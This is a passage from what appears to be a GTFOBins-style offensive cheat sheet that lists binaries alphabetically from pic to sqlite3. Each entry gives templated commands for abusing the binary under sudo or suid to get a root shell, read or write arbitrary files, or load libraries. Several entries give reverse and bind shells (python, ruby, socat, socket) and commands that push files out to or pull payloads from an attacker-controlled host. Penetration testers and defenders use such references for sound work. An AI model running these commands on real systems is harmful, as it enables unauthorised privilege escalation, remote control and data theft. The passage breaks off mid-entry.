Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pic -U
.PS
sh X sh X
```
<!-- cheat
-->

### pic file-read

The output is prefixed with some content.

```sh title:"sudo / suid / unprivileged"
pic $file_in
```
<!-- cheat
var file_in
-->

## pico

Alias of [nano](#nano). All techniques from `nano` apply.

## pidstat

### pidstat shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
pidstat -e /bin/sh
```
<!-- cheat
-->

#### pidstat shell - suid override

```sh title:"suid variant"
pidstat -e /bin/sh -p
```
<!-- cheat
-->

## pip

### pip shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
pip config --editor '/bin/sh -s' edit
```
<!-- cheat
-->

### pip inherit (inherits from python)

This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```  The `--break-system-packages` flag can be omitted in older systems.

```sh title:"sudo / unprivileged"
echo '...' >setup.py
pip install --break-system-packages .
```
<!-- cheat
-->

## pipx

### pipx inherit (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo / unprivileged"
echo '...' >$script
pipx run $script
```
<!-- cheat
var script
-->

## pkexec

### pkexec shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
pkexec /bin/sh
```
<!-- cheat
-->

## pkg

### pkg command

Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ```

```sh title:"sudo"
pkg install -y --no-repo-update ./x-1.0.txz
```
<!-- cheat
-->

## plymouth

### plymouth shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
plymouth ask-for-password --prompt=x --command=/bin/sh
```
<!-- cheat
-->

#### plymouth shell - suid override

```sh title:"suid variant"
plymouth ask-for-password --prompt=x --command='/bin/sh -p'
```
<!-- cheat
-->

## podman

### podman shell

This requires an actual image to be available (e.g., `alpine`) downloading it if not present.

```sh title:"sudo / unprivileged"
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```
<!-- cheat
-->

## poetry

### poetry inherit (inherits from python)

This allows to run Python code (`...`).  A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`.

```sh title:"sudo / unprivileged"
echo '...' >$tmp_file
poetry run python $tmp_file
```
<!-- cheat
var tmp_file
-->

## posh

### posh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
posh
```
<!-- cheat
-->

## pr

### pr file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
pr -T $file_in
```
<!-- cheat
var file_in
-->

## procmail

### procmail command

The program is picky about the file ownership, and waits for some input.

```sh title:"sudo / unprivileged"
echo -e ':0\n| $cmd_file >$tmp_file
procmail -m $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## pry

### pry inherit (inherits from irb)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
pry
```
<!-- cheat
-->

## psftp

### psftp shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
psftp
!/bin/sh
```
<!-- cheat
-->

## psql

A valid PostgreSQL server must be available to connect to.

### psql shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
psql
\! /bin/sh
```
<!-- cheat
-->

### psql inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
psql
\?
```
<!-- cheat
-->

## ptx

While the program is capable of reading the file, it outputs a "permuted index" of its content, thus altering it. Adjusting the options could yield more readable outputs.

### ptx file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
ptx -w 999 $file_in
```
<!-- cheat
var file_in
-->

## puppet

### puppet shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```
<!-- cheat
-->

### puppet file-read

The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.

```sh title:"sudo / unprivileged"
puppet filebucket -l diff /dev/null $file_in
```
<!-- cheat
var file_in
-->

### puppet file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
puppet apply -e 'file { "$file_out": content => "$data" }'
```
<!-- cheat
var data
var file_out
-->

## pwsh

### pwsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
pwsh
```
<!-- cheat
-->

### pwsh file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
pwsh -c '"$data" | Out-File $file_out'
```
<!-- cheat
var data
var file_out
-->

## pygmentize

### pygmentize file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
pygmentize -l text $file_in
```
<!-- cheat
var file_in
-->

## pyright

### pyright file-read #1

Content is leaked as error messages.

```sh title:"sudo / unprivileged"
pyright $file_in
```
<!-- cheat
var file_in
-->

### pyright file-read #2

Content is leaked as error messages in JSON format.

```sh title:"sudo / unprivileged"
pyright --outputjson $file_in
```
<!-- cheat
var file_in
-->

### pyright file-read #3

Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.

```sh title:"sudo / unprivileged"
pyright -w $dir_in/
```
<!-- cheat
var dir_in
-->

## python

The payloads are compatible with both Python version 2 and 3.

### python shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
python -c 'import os; os.execl("/bin/sh", "sh")'
```
<!-- cheat
-->

#### python shell - capabilities override

```sh title:"capabilities variant"
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
<!-- cheat
-->

#### python shell - suid override

```sh title:"suid variant"
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
<!-- cheat
-->

### python reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("$lhost",$lport))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```
<!-- cheat
import tun_ip
import lports
-->

### python file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
python -c 'print(open("$file_in").read())'
```
<!-- cheat
var file_in
-->

### python file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
python -c 'open("$file_out","w+").write("$data")'
```
<!-- cheat
var data
var file_out
-->

### python download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("$scheme://$lhost$file_in", "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### python upload #1

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("$scheme://$lhost", open("$file_in", "rb").read())'
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### python upload #2

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", $lport), s.SimpleHTTPRequestHandler).serve_forever()'
```
<!-- cheat
import lports
-->

### python library-load

Load an attacker-supplied shared library.

```sh title:"capabilities / sudo / suid / unprivileged"
python -c 'from ctypes import cdll; cdll.LoadLibrary("$lib")'
```
<!-- cheat
var lib
-->

## qpdf

### qpdf file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
qpdf --empty --add-attachment $file_in --key=x -- $file_out
qpdf --show-attachment=x $file_out
```
<!-- cheat
var file_in
var file_out
-->

## rake

### rake file-read

The file is actually parsed and the first wrong line is returned in an error message.

```sh title:"sudo / unprivileged"
rake -f $file_in
```
<!-- cheat
var file_in
-->

### rake inherit (inherits from ruby)

This allows to run Ruby code (`...`).

```sh title:"sudo / unprivileged"
rake -p '...'
```
<!-- cheat
-->

## ranger

### ranger shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ranger
S
```
<!-- cheat
-->

## rc

### rc shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rc
```
<!-- cheat
-->

## readelf

### readelf file-read

Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.

```sh title:"sudo / suid / unprivileged"
readelf -a @$file_in
```
<!-- cheat
var file_in
-->

## red

Alias of [ed](#ed). All techniques from `ed` apply.

## redcarpet

### redcarpet file-read

The file is actually parsed as a Markdown file.

```sh title:"sudo / unprivileged"
redcarpet $file_in
```
<!-- cheat
var file_in
-->

## redis

### redis file-write

Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.  Keep in mind that it's actually the server to perform the file write.

```sh title:"sudo / suid / unprivileged"
redis-cli -h 127.0.0.1
config set dir $dir_out/
config set dbfilename output-file
set x "$data"
save
```
<!-- cheat
var data
var dir_out
-->

## restic

### restic shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```
<!-- cheat
-->

#### restic shell #1 - suid override

```sh title:"suid variant"
RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
```
<!-- cheat
-->

### restic shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```
<!-- cheat
-->

#### restic shell #2 - suid override

```sh title:"suid variant"
restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
```
<!-- cheat
-->

### restic command #1

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
RESTIC_PASSWORD_COMMAND='$cmd_file' restic backup
```
<!-- cheat
var cmd_file
-->

### restic command #2

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
restic --password-command='$cmd_file' backup
```
<!-- cheat
var cmd_file
-->

### restic upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
restic backup -r rest:$scheme://$lhost:$lport/x $file_in
```
<!-- cheat
import tun_ip
import lports
import scheme
var file_in
-->

## rev

### rev file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
rev $file_in | rev
```
<!-- cheat
var file_in
-->

## rlogin

### rlogin upload

The file is corrupted by leading and trailing spurious data.

```sh title:"sudo / suid / unprivileged"
rlogin -l $data -p $lport $lhost
```
<!-- cheat
import tun_ip
import lports
var data
-->

## rlwrap

### rlwrap shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rlwrap /bin/sh
```
<!-- cheat
-->

#### rlwrap shell - suid override

```sh title:"suid variant"
rlwrap /bin/sh -p
```
<!-- cheat
-->

### rlwrap file-write

This adds timestamps to the output file. This relies on the external `echo` command.

```sh title:"sudo / suid / unprivileged"
rlwrap -l $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

## rpm

### rpm shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rpm --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpm shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rpm --pipe '/bin/sh 0<&1'
```
<!-- cheat
-->

### rpm command

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```

```sh title:"sudo"
rpm -ivh x-1.0-1.noarch.rpm
```
<!-- cheat
-->

### rpm inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
rpm --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmdb

### rpmdb shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rpmdb --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmdb inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
rpmdb --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmquery

### rpmquery shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rpmquery --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmquery inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
rpmquery --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmverify

### rpmverify shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rpmverify --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmverify inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
rpmverify --eval '%{lua:...}'
```
<!-- cheat
-->

## rsync

### rsync shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```
<!-- cheat
-->

#### rsync shell - suid override

```sh title:"suid variant"
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```
<!-- cheat
-->

## rsyslogd

### rsyslogd command

In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:  ``` ssh somerandomstring@victim.com ```

```sh title:"sudo"
cat >$tmp_file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^$cmd_file
EOF

rsyslogd -f $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## rtorrent

### rtorrent shell

After the shell, exit with `Ctrl-Q`.

```sh title:"sudo / suid / unprivileged"
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
<!-- cheat
-->

#### rtorrent shell - suid override

```sh title:"suid variant"
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
<!-- cheat
-->

## ruby

### ruby shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / unprivileged"
ruby -e 'exec "/bin/sh"'
```
<!-- cheat
-->

#### ruby shell - capabilities override

```sh title:"capabilities variant"
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```
<!-- cheat
-->

### ruby reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$lhost",$lport);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
<!-- cheat
import tun_ip
import lports
-->

### ruby file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
ruby -e 'puts File.read("$file_in")'
```
<!-- cheat
var file_in
-->

### ruby file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
ruby -e 'File.open("$file_out", "w+") { |f| f.write("$data") }'
```
<!-- cheat
var data
var file_out
-->

### ruby download

Pull a remote file to disk.

```sh title:"sudo / unprivileged"
ruby -e 'require "open-uri"; download = URI.open("$scheme://$lhost$file_in"); IO.copy_stream(download, "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### ruby upload

Push a local file to a remote receiver.

```sh title:"sudo / unprivileged"
ruby -run -e httpd . -p 80
```
<!-- cheat
-->

### ruby library-load

Load an attacker-supplied shared library.

```sh title:"sudo / unprivileged"
ruby -e 'require "fiddle"; Fiddle.dlopen("$lib")'
```
<!-- cheat
var lib
-->

## run-mailcap

### run-mailcap inherit #1 (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
run-mailcap --action=view text/plain:/etc/hosts
```
<!-- cheat
-->

### run-mailcap inherit #2 (inherits from vi)

The file must exist and be not empty.

```sh title:"sudo / unprivileged"
run-mailcap --action=edit text/plain:$file_out
```
<!-- cheat
var file_out
-->

## run-parts

### run-parts shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
run-parts --new-session --regex '^sh$' /bin
```
<!-- cheat
-->

#### run-parts shell #1 - suid override

```sh title:"suid variant"
run-parts --new-session --regex '^sh$' /bin --arg='-p'
```
<!-- cheat
-->

### run-parts shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
cp /bin/sh $tmp_dir/
run-parts $tmp_dir/
```
<!-- cheat
var tmp_dir
-->

#### run-parts shell #2 - suid override

```sh title:"suid variant"
cp /bin/sh $tmp_dir/
run-parts $tmp_dir/ --arg='-p'
```
<!-- cheat
var tmp_dir
-->

## runscript

### runscript shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo '! exec /bin/sh' >$tmp_file
runscript $tmp_file
```
<!-- cheat
var tmp_file
-->

## rustc

### rustc file-read

The compiler leaks some file lines in the compiler error.

```sh title:"sudo / unprivileged"
rustc $file_in
```
<!-- cheat
var file_in
-->

### rustc file-write

The comment appears in the compiled program.

```sh title:"sudo / unprivileged"
echo 'fn main() { println!("$data"); }' >$tmp_file
rustc $tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### rustc inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
rustc --explain E0001
```
<!-- cheat
-->

## rustdoc

### rustdoc file-read

Partial content is displayed as error messages.

```sh title:"sudo / unprivileged"
rustdoc $file_in
```
<!-- cheat
var file_in
-->

### rustdoc file-write

This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.

```sh title:"sudo / unprivileged"
echo '//! $data' >$tmp_file
rustdoc $tmp_file -o $dir_out/
```
<!-- cheat
var data
var dir_out
var tmp_file
-->

## rustfmt

### rustfmt file-read

Partial content is displayed as error messages.

```sh title:"sudo / unprivileged"
rustfmt $file_in
```
<!-- cheat
var file_in
-->

## rustup

### rustup shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
mkdir $tmp_dir/bin/
mkdir $tmp_dir/lib/
cp /bin/sh $tmp_dir/bin/rustc
rustup toolchain link x $tmp_dir/
rustup run x rustc
```
<!-- cheat
var tmp_dir
-->

### rustup command

Execute an arbitrary non-interactive command.

```sh title:"sudo / unprivileged"
mkdir $tmp_dir/bin/
mkdir $tmp_dir/lib/
echo '$cmd_file' >$tmp_dir/bin/rustc
chmod +x $tmp_dir/bin/rustc
rustup toolchain link x $tmp_dir/
rustup run x rustc
```
<!-- cheat
var cmd_file
var tmp_dir
-->

## rview

Alias of [view](#view). All techniques from `view` apply.

## rvim

Alias of [vim](#vim). All techniques from `vim` apply.

## sash

### sash shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
sash
```
<!-- cheat
-->

## scanmem

### scanmem shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
scanmem
shell /bin/sh
```
<!-- cheat
-->

## scp

### scp shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
chmod +x $tmp_file
scp -S $tmp_file x x:
```
<!-- cheat
var tmp_file
-->

### scp shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```
<!-- cheat
-->

### scp download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
scp user@$lhost:$file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### scp upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
scp $file_in user@$lhost:$file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## screen

### screen shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
screen
```
<!-- cheat
-->

### screen file-write #1

Data is appended to the file and `\n` is converted to `\r\n`.

```sh title:"sudo / unprivileged"
screen -L -Logfile $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

### screen file-write #2

Data is appended to the file and `\n` is converted to `\r\n`.

```sh title:"sudo / unprivileged"
screen -L $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

## script

### script shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
script -q /dev/null
```
<!-- cheat
-->

### script file-write

The content appears among the log prints.

```sh title:"sudo / suid / unprivileged"
script -q -c '# $data' $file_out
```
<!-- cheat
var data
var file_out
-->

## scrot

This requires a running X server.

### scrot shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
scrot -e /bin/sh
```
<!-- cheat
-->

## sed

### sed shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
<!-- cheat
-->

### sed shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
sed e
```
<!-- cheat
-->

### sed file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
sed '' $file_in
```
<!-- cheat
var file_in
-->

### sed file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
sed -n '1s/.*/$data/w $file_out' /etc/hosts
```
<!-- cheat
var data
var file_out
-->

## service

### service shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
service ../../bin/sh
```
<!-- cheat
-->

## setarch

### setarch shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
setarch -3 /bin/sh
```
<!-- cheat
-->

#### setarch shell - suid override

```sh title:"suid variant"
setarch -3 /bin/sh -p
```
<!-- cheat
-->

## setcap

### setcap privilege-escalation

This can be used to assign capabilities to executable files.

```sh title:"sudo / suid"
setcap cap_setuid+ep $cmd_file
```
<!-- cheat
var cmd_file
-->

## setfacl

### setfacl privilege-escalation

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```sh title:"sudo / suid"
setfacl -m u:$(id -un):rwx $file_in
```
<!-- cheat
var file_in
-->

## setlock

### setlock shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
setlock - /bin/sh
```
<!-- cheat
-->

#### setlock shell - suid override

```sh title:"suid variant"
setlock - /bin/sh -p
```
<!-- cheat
-->

## sftp

### sftp shell

This still requires a successfull connection to the server.

```sh title:"sudo / suid / unprivileged"
sftp user@$lhost
!/bin/sh
```
<!-- cheat
import tun_ip
-->

### sftp download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
sftp user@$lhost
get $file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### sftp upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
sftp user@$lhost
put $file_in $file_out
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## sg

### sg shell

Commands can be run if the current user's group is specified, therefore no additional permissions are needed.

```sh title:"sudo / unprivileged"
sg $(id -ng)
```
<!-- cheat
-->

#### sg shell - sudo override

```sh title:"sudo variant"
sg root
```
<!-- cheat
-->

## shred

### shred file-write

This actually deletes the chosen file.

```sh title:"sudo / suid / unprivileged"
shred -u $file_out
```
<!-- cheat
var file_out
-->

## shuf

### shuf file-read

The read file content is corrupted by randomizing the order of NUL terminated strings.

```sh title:"sudo / suid / unprivileged"
shuf -z $file_in
```
<!-- cheat
var file_in
-->

### shuf file-write

The written file content is corrupted by adding a newline.

```sh title:"sudo / suid / unprivileged"
shuf -e $data -o $file_out
```
<!-- cheat
var data
var file_out
-->

## slsh

### slsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
slsh -e 'system("/bin/sh")'
```
<!-- cheat
-->

## smbclient

### smbclient shell

A valid SMB/CIFS server must be available.

```sh title:"sudo / unprivileged"
smbclient '\\host\share'
!/bin/sh
```
<!-- cheat
-->

### smbclient download

Pull a remote file to disk.

```sh title:"sudo / unprivileged"
smbclient '\\$lhost\share' -c 'get $file_in $file_out'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### smbclient upload

Push a local file to a remote receiver.

```sh title:"sudo / unprivileged"
smbclient '\\$lhost\share' -c 'put $file_in $file_out'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

## snap

### snap command

Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` mkdir -p meta/hooks echo -e '#!/bin/sh\n$cmd_file; false' >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```

```sh title:"sudo"
snap install xxxx_1.0_all.snap --dangerous --devmode
```
<!-- cheat
-->

## socat

### socat shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```
<!-- cheat
-->

#### socat shell - suid override

```sh title:"suid variant"
socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
```
<!-- cheat
-->

### socat reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
socat tcp-connect:$lhost:$lport exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
<!-- cheat
import tun_ip
import lports
-->

#### socat reverse-shell - suid override

```sh title:"suid variant"
socat tcp-connect:$lhost:$lport 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
<!-- cheat
import tun_ip
import lports
-->

### socat bind-shell

Bind a shell to a local port for the attacker to connect to.

```sh title:"sudo / suid / unprivileged"
socat tcp-listen:$lport,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
<!-- cheat
import lports
-->

#### socat bind-shell - suid override

```sh title:"suid variant"
socat tcp-listen:$lport,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```
<!-- cheat
import lports
-->

### socat file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
socat -u file:$file_in -
```
<!-- cheat
var file_in
-->

### socat file-write

The `echo` command is actually used.

```sh title:"sudo / suid / unprivileged"
socat -u 'exec:echo $data' open:$file_out,creat
```
<!-- cheat
var data
var file_out
-->

### socat download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
socat -u tcp-connect:$lhost:$lport open:$file_out,creat
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### socat upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
socat -u file:$file_in tcp-connect:$lhost:$lport
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## socket

### socket reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
socket -qvp '/bin/sh -i' $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### socket bind-shell

Bind a shell to a local port for the attacker to connect to.

```sh title:"sudo / suid / unprivileged"
socket -svp '/bin/sh -i' $lport
```
<!-- cheat
import lports
-->

## soelim

### soelim file-read

The content is actually parsed and corrupted by the command.

```sh title:"sudo / suid / unprivileged"
soelim $file_in
```
<!-- cheat
var file_in
-->

## softlimit

### softlimit shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
softlimit /bin/sh
```
<!-- cheat
-->

#### softlimit shell - suid override

```sh title:"suid variant"
softlimit /bin/sh -p
```
<!-- cheat
-->

## sort

### sort file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
sort -m $file_in
```
<!-- cheat
var file_in
-->

### sort file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | sort -m -o $file_out
```
<!-- cheat
var data
var file_out
-->

## split

### split shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```
<!-- cheat
-->

### split file-read

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```sh title:"sudo / suid / unprivileged"
split -b 999 --additional-suffix suffix $file_in prefix
cat prefixaasuffix
```
<!-- cheat
var file_in
-->

### split file-write

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

```sh title:"sudo / suid / unprivileged"
split -b 999 --additional-suffix suffix $file_in prefix
```
<!-- cheat
var file_in
-->

## sqlite3

### sqlite3 shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
sqlite3 /dev/null '.shell /bin/sh'
```
<!-- cheat
-->

### sqlite3 file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import $file_in x
SELECT * FROM x;
EOF
```
<!-- cheat
var file_in
-->

### sqlite3 file-write

Write attacker-controlled data to an arbitrary path.

